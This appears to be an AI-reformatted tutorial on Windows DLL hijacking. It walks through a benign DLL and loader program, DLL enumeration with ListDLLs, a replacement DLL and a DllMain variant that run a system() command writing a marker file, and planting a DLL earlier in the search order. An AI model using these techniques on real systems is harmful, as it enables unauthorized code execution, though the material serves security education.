
---
## **1. What are Dynamic Link Libraries (DLLs)?**

Operating systems use **DLLs (Dynamic Link Libraries)** to allow multiple programs to share common functions. Instead of each program including all the code it needs, it loads the necessary DLLs when it runs.

- In **Linux**, these are called **Shared Objects (.so)**.
    
- In **Windows**, they are called **DLLs (.dll)**.
    

Because DLLs are loaded dynamically (only when needed), an attacker can take advantage of this process to inject **malicious DLLs** into a program.

There are two main ways an attacker can exploit DLLs:

1. **Replacing an existing DLL** – If the attacker can **overwrite a DLL** that a program depends on, they can make the program execute malicious code.
    
2. **Placing a fake DLL in a high-priority location** – Windows **searches for DLLs in a specific order**. If an attacker places a **malicious DLL in a location Windows checks first**, it will get loaded instead of the real one.
    

---

## **2. A Simple Example of DLL Usage**

Let’s look at how a program uses a DLL:

### **Step 1: Creating a Simple DLL**

First, we write a small C program that adds two numbers. This code will go inside a DLL.

#### **Code for the DLL (lib.c):**

```c
#include <windows.h>

__declspec(dllexport) int add_numbers(int a, int b) {
    return a + b;
}
```

We compile it into a DLL using:

```sh
x86_64-w64-mingw32-gcc -shared -o lib.dll lib.c
```

### **Step 2: Using the DLL in a Main Program**

Now, we create a program that loads this DLL and uses the `add_numbers` function.

#### **Code for the Main Program (main.c):**

```c
#include <stdio.h>
#include <windows.h>

typedef int (*AddNumbersFunc)(int, int);

int main() {
    printf("[+] Starting main.exe...\n");

    HINSTANCE hinstLib;
    AddNumbersFunc addNumbers;
    int result;

    // Load the DLL
    hinstLib = LoadLibrary("lib.dll");
    if (hinstLib == NULL) {
        printf("[-] Could not load the DLL. Error: %lu\n", GetLastError());
        return 1;
    }
    printf("[+] DLL Loaded Successfully.\n");

    // Get function pointer
    addNumbers = (AddNumbersFunc)GetProcAddress(hinstLib, "add_numbers");
    if (addNumbers == NULL) {
        printf("[-] Could not find the function in the DLL. Error: %lu\n", GetLastError());
        FreeLibrary(hinstLib);
        return 1;
    }
    printf("[+] Function Loaded Successfully.\n");

    // Call the function
    result = addNumbers(5, 10);
    printf("[+] Result of add_numbers(5, 10): %d\n", result);

    // Free the DLL module
    FreeLibrary(hinstLib);
    printf("[+] DLL Unloaded.\n");

    return 0;
}
```

We compile this program with:

```sh
x86_64-w64-mingw32-gcc -o main.exe main.c -mwindows
```

---

## **3. Finding DLLs Used by a Service**

To find out which DLLs a **Windows service** is using, we can use **Listdlls64.exe** (a tool from Sysinternals).

```sh
C:\Users\Quickemu\Downloads>.\Listdlls64.exe /accepteula simpleService
```

Example output:

```
Listdlls v3.2 - List DLLs
Copyright (C) 1997-2016 Mark Russinovich
Sysinternals

simpleService.exe pid: 4004
Command line: "C:\Users\Quickemu\Downloads\simpleService.exe"

Base                Size      Path
0x00000000a0140000  0x12000   C:\Users\Quickemu\Downloads\simpleService.exe
0x00000000c2550000  0xc4000   C:\Windows\System32\KERNEL32.DLL
0x00000000c0380000  0x3ad000  C:\Windows\System32\KERNELBASE.dll
...
```

This tells us **which DLLs** the program is using and their locations.

---

## **4. Replacing DLLs with Malicious Ones**

If we find that a program **loads a DLL from a location we can modify**, we can replace it with a malicious DLL.

Here’s a **malicious version** of our earlier DLL:

#### **Malicious DLL (malicious-lib.c)**

```c
#include <windows.h>
#include <stdlib.h>

__declspec(dllexport) int add_numbers(int a, int b) {
    system("echo 'hacks' > C:\\Users\\Quickemu\\Downloads\\HACKED");
    return a + b;
}
```

We compile it as a DLL:

```sh
x86_64-w64-mingw32-gcc -shared -o malicious-lib.dll malicious-lib.c
```

If we **replace the original DLL** with this one, the program will execute our malicious code **every time it runs**.

### **Another Way: Injecting Code Using DllMain**

If we don’t know which function the program will call, we can run our code **whenever the DLL is loaded** using `DllMain`:

```c
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
    system("echo 'hacks' > C:\\Users\\Quickemu\\Downloads\\HACKED");
    return TRUE;
}
```

However, this might **break the program** or **cause visible issues** in some cases.

---

## **5. Tricking Windows into Loading a Fake DLL**

When a program loads a DLL **without a full path**, Windows follows a **specific search order** to find it.

### **Example: Loading a DLL with a Full Path**

```c
hinstLib = LoadLibrary(TEXT("C:\\Users\\Quickemu\\Downloads\\lib.dll"));
```

### **Example: Loading a DLL Without a Path**

```c
hinstLib = LoadLibrary(TEXT("lib.dll"));
```

### **Windows DLL Search Order:**

1. **Folder where the program is located**
    
2. **System folder** (`C:\Windows\System32`)
    
3. **16-bit system folder**
    
4. **Windows directory** (`C:\Windows`)
    
5. **Current working directory**
    
6. **Directories listed in the `PATH` environment variable**
    

### **Example Attack Scenario:**

- The **real DLL** is located in **C:\Windows**.
    
- The attacker places a **malicious DLL** in **C:\Windows\System32** (which has a higher priority).
    
- Windows **loads the attacker’s DLL instead of the real one**.
    

This allows an attacker to **execute code without replacing the original DLL**.

---

## **6. References**

- **ListDLLs**: A tool that lists all DLLs loaded into processes.  
    [🔗 Microsoft Docs](https://learn.microsoft.com/en-us/sysinternals/downloads/listdlls)
    
- **Compiling a DLL using MinGW**  
    [🔗 Malicious.Link](https://malicious.link/posts/2020/compiling-a-dll-using-mingw/)
    
- **Windows DLL Search Order**  
    [🔗 Microsoft Docs](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
    

---

This should be much easier to understand while keeping all the details. Let me know if you need any refinements! 🚀